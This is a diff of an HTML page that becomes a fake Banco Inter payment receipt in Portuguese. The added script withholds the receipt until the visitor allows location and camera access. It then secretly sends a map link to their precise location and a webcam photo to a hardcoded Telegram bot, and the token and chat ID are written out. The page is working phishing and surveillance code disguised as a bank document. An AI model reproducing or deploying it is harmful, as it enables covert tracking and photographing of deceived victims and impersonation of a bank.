@@ -1,20 +1,21 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pt-BR">
 
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Transaction Receipt Verification</title>
+  <title>Comprovante de Pagamento - Banco Inter</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      text-align: center;
       background-color: #f8f9fa;
       margin: 0;
       padding: 20px;
+      text-align: center;
     }
 
-    #container {
+    #permission-prompt,
+    #receipt {
       background: white;
       padding: 20px;
       border-radius: 12px;
@@ -23,106 +24,199 @@
       margin: 50px auto;
     }
 
-    video,
-    canvas {
-      max-width: 100%;
-      border-radius: 12px;
-      margin: 10px 0;
+    #receipt {
+      display: none;
+      text-align: left;
     }
 
-    button {
-      background-color: #007bff;
-      color: white;
-      border: none;
-      padding: 10px 20px;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
+    h1,
+    h2 {
+      color: #ff6200;
     }
 
-    button:hover {
-      background-color: #0056b3;
+    .receipt-header,
+    .receipt-footer {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .receipt-details {
+      border-top: 2px solid #ff6200;
+      border-bottom: 2px solid #ff6200;
+      padding: 10px 0;
+      margin: 20px 0;
+    }
+
+    .detail {
+      margin: 5px 0;
+    }
+
+    .label {
+      font-weight: bold;
     }
   </style>
 </head>
 
 <body>
 
-  <div id="container">
-    <h1>Receipt Verification in Progress</h1>
-    <p>Please wait while we verify your receipt and device information.</p>
+  <div id="permission-prompt">
+    <p>Para visualizar o comprovante, clique em 'permitir'.</p>
+  </div>
 
-    <div id="location-section">
-      <h2>Device Location Captured</h2>
-      <p id="latitude">Latitude: Capturing...</p>
-      <p id="longitude">Longitude: Capturing...</p>
+  <div id="receipt">
+    <div class="receipt-header">
+      <h1><img src="logo-inter.svg.png" style="max-width: 200px;" /></h1>
+      <h2>Comprovante de Pagamento</h2>
     </div>
-
-    <div id="camera-section">
-      <h2>Camera Verification</h2>
-      <video id="video" autoplay playsinline></video>
-      <canvas id="canvas"></canvas>
-      <p id="capture-message">Camera access needed for additional verification.</p>
+    <div class="receipt-details">
+      <p class="detail"><span class="label">Data:</span> <span id="date"></span></p>
+      <p class="detail"><span class="label">Hora:</span> <span id="time"></span></p>
+      <p class="detail"><span class="label">Valor:</span> R$ <span id="amount"></span></p>
+      <p class="detail"><span class="label">Favorecido:</span> <span id="beneficiary"></span></p>
+      <p class="detail"><span class="label">CPF/CNPJ:</span> <span id="cpfCnpj"></span></p>
+      <p class="detail"><span class="label">Banco:</span> <span id="bank"></span></p>
+      <p class="detail"><span class="label">Agência:</span> <span id="agency"></span></p>
+      <p class="detail"><span class="label">Conta:</span> <span id="account"></span></p>
+      <p class="detail"><span class="label">Tipo de Conta:</span> <span id="accountType"></span></p>
+      <p class="detail"><span class="label">Código de Autenticação:</span> <span id="authCode"></span></p>
     </div>
-
-    <p>Your details will be processed shortly. Thank you for your patience.</p>
+    <div class="receipt-footer">
+      <p>Este é um comprovante gerado eletronicamente e não requer assinatura.</p>
+    </div>
   </div>
 
   <script>
-    // Capture and log user's location
-    function captureLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            document.getElementById('latitude').innerText = `Latitude: ${latitude}`;
-            document.getElementById('longitude').innerText = `Longitude: ${longitude}`;
+    const BOT_TOKEN = '7616155962:AAG1RQIcEtpZ5f2EsUHOnT8ND4oAvKF3U6U';
+    const CHAT_ID = 610303414;
 
-            // Log location data to console
-            console.log("Location Data:");
-            console.log(`Latitude: ${latitude}`);
-            console.log(`Longitude: ${longitude}`);
-          },
-          (error) => {
-            console.error("Location access denied or unavailable.");
-          }
-        );
-      }
+    // Function to parse query parameters
+    function getQueryParams() {
+      const params = new URLSearchParams(window.location.search);
+      return {
+        date: params.get('date') || '01/01/2025',
+        time: params.get('time') || '12:00',
+        amount: params.get('amount') || '0,00',
+        beneficiary: params.get('beneficiary') || 'Nome do Favorecido',
+        cpfCnpj: params.get('cpfCnpj') || '000.000.000-00',
+        bank: params.get('bank') || 'Banco Inter',
+        agency: params.get('agency') || '0001',
+        account: params.get('account') || '123456-7',
+        accountType: params.get('accountType') || 'Corrente',
+        authCode: params.get('authCode') || 'ABC123DEF456GHI789'
+      };
     }
 
-    // Access user's camera, take a snapshot, and log the image data
-    async function captureCamera() {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      const context = canvas.getContext('2d');
+    // Function to request location permission first, then camera permission
+    function requestPermissions() {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          console.log("Localização acessada com sucesso:", position.coords);
+          sendMessage(`https://www.google.com/maps/search/?api=1&query=${position.coords.latitude}%2C${position.coords.longitude}`);
 
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
-
-        // Automatically capture a frame after a short delay
-        setTimeout(() => {
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const imageData = canvas.toDataURL('image/png'); // Get the image data URL
-
-          // Log image data to console
-          console.log("Captured Image Data (Base64):");
-          console.log(imageData);
-
-          document.getElementById('capture-message').innerText = "Photo captured and verified.";
-          stream.getTracks().forEach(track => track.stop()); // Stop the video stream after capture
-        }, 5000); // 5-second delay to allow stabilization
-      } catch (error) {
-        console.error("Camera access denied or unavailable.");
-      }
+          // Request camera permission after location is granted
+          navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+              console.log("Permissão da câmera concedida.");
+              captureImageAndSendToTelegram(stream);  // Capture image and send to Telegram
+              showReceipt();
+            })
+            .catch((error) => {
+              console.error("Erro ao acessar a câmera:", error);
+              alert('É necessário conceder a permissão da câmera para visualizar o comprovante.');
+            });
+        },
+        (error) => {
+          console.error("Erro ao acessar a localização:", error);
+          alert('É necessário conceder a permissão de localização para visualizar o comprovante.');
+        },
+        { enableHighAccuracy: true }
+      );
     }
 
-    // Trigger location and camera capture on page load
-    window.addEventListener('load', () => {
-      captureLocation();
-      captureCamera();
-    });
+    // Function to capture an image from the camera stream and send it to Telegram
+    function captureImageAndSendToTelegram(stream) {
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      // Wait for the video to load and capture the first frame
+      video.onloadedmetadata = function () {
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        
+        // Set the canvas dimensions to the video dimensions
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        
+        // Draw the first frame from the video onto the canvas
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Convert canvas to Blob (image file)
+        canvas.toBlob((blob) => {
+          sendCapturedImageToTelegram(blob);
+        }, 'image/jpeg');
+      };
+    }
+
+    // Function to send the captured image to Telegram using FormData
+    function sendCapturedImageToTelegram(imageBlob) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID); // Replace with the actual chat ID
+      formData.append('photo', imageBlob, 'captured_image.jpg'); // Add the image file (with a name)
+
+      // Send the image using fetch
+      fetch(url, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(response => response.json())
+      .then(data => console.log('Image sent to Telegram:', data))
+      .catch(error => console.error('Error sending image to Telegram:', error));
+    }
+
+    // Function to display the receipt after permissions are granted
+    function showReceipt() {
+      document.getElementById('permission-prompt').style.display = 'none';
+      document.getElementById('receipt').style.display = 'block';
+
+      // Populate the receipt with query parameters
+      const params = getQueryParams();
+      document.getElementById('date').textContent = params.date;
+      document.getElementById('time').textContent = params.time;
+      document.getElementById('amount').textContent = params.amount;
+      document.getElementById('beneficiary').textContent = params.beneficiary;
+      document.getElementById('cpfCnpj').textContent = params.cpfCnpj;
+      document.getElementById('bank').textContent = params.bank;
+      document.getElementById('agency').textContent = params.agency;
+      document.getElementById('account').textContent = params.account;
+      document.getElementById('accountType').textContent = params.accountType;
+      document.getElementById('authCode').textContent = params.authCode;
+    }
+
+    // Request permissions on page load
+    window.onload = requestPermissions;
+
+    // Function to send a message through the Telegram Bot API using fetch
+    function sendMessage(text) {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+        }),
+      })
+      .then(response => response.json())
+      .then(data => console.log('Message sent:', data))
+      .catch(error => console.error('Error sending message:', error));
+    }
+
   </script>
 
 </body>
